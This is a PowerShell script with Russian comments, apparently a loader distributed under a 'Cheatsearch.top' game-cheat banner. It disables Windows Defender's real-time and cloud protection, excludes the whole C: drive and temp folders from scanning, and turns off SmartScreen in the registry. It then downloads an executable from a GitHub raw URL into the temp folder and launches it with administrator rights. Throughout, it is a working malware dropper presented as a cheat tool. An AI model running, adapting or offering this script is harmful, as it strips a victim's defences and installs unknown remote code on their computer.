[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ErrorActionPreference = "SilentlyContinue"
Clear

Write-Host "--- Debug Mode: Cheatsearch.top ---" -ForegroundColor Yellow

# 1. Проверка прав администратора
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[-] ОШИБКА: Скрипт запущен БЕЗ прав администратора!" -ForegroundColor Red
    Write-Host "[!] Команды отключения антивируса НЕ сработают." -ForegroundColor Yellow
} else {
    Write-Host "[+] Права администратора подтверждены." -ForegroundColor Green
}

# 2. ОТКЛЮЧЕНИЕ ЗАЩИТЫ (Новый блок)
Write-Host "[*] Отключение Windows Defender и SmartScreen..." -ForegroundColor Cyan

# Добавляем исключения для путей и самого файла
$outputFile = "$env:TEMP\ccmmd.exe"
Add-MpPreference -ExclusionPath "C:\", "C:\Windows\Temp", "C:\ProgramData", "$env:TEMP", $outputFile

# Отключаем мониторинг в реальном времени и облачную проверку
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -MAPSReporting 0

# Отключаем SmartScreen через реестр
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name 'SmartScreenEnabled' -Value 'Off' -Type String
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name 'EnableSmartScreen' -Value 0 -Type DWORD

Write-Host "[+] Защита деактивирована (насколько это возможно)." -ForegroundColor Gray

# 3. Настройка путей
Write-Host "[+] Путь для сохранения: $outputFile" -ForegroundColor Gray

# 4. Попытка скачивания
$url = "https://github.com/expendertie/chear11/raw/refs/heads/main/main.exe"
Write-Host "[*] Начинаю скачивание..." -ForegroundColor Cyan

try {
    # Используем более надежный метод загрузки
    Invoke-WebRequest -Uri $url -OutFile $outputFile -UserAgent "Mozilla/5.0" -UseBasicParsing
    Write-Host "[+] Файл успешно скачан." -ForegroundColor Green
} catch {
    Write-Host "[-] ОШИБКА СКАЧИВАНИЯ: $($_.Exception.Message)" -ForegroundColor Red
    # Резервный метод через WebClient
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc.DownloadFile($url, $outputFile)
        Write-Host "[+] Файл успешно скачан (WebClient)." -ForegroundColor Green
    } catch {
        Write-Host "[-] КРИТИЧЕСКАЯ ОШИБКА: Скачивание не удалось." -ForegroundColor Red
    }
}

# 5. Проверка наличия файла перед запуском
if (Test-Path $outputFile) {
    Write-Host "[*] Попытка запуска файла..." -ForegroundColor Cyan
    try {
        $process = Start-Process -FilePath $outputFile -Verb RunAs -PassThru -ErrorAction Stop
        Write-Host "[+] Процесс запущен (ID: $($process.Id))" -ForegroundColor Green
    } catch {
        Write-Host "[-] ОШИБКА ЗАПУСКА: $($_.Exception.Message)" -ForegroundColor Red
    }
} else {
    Write-Host "[-] ОШИБКА: Файл не найден на диске." -ForegroundColor Red
}

Write-Host "--- Конец проверки ---" -ForegroundColor Yellow
pause
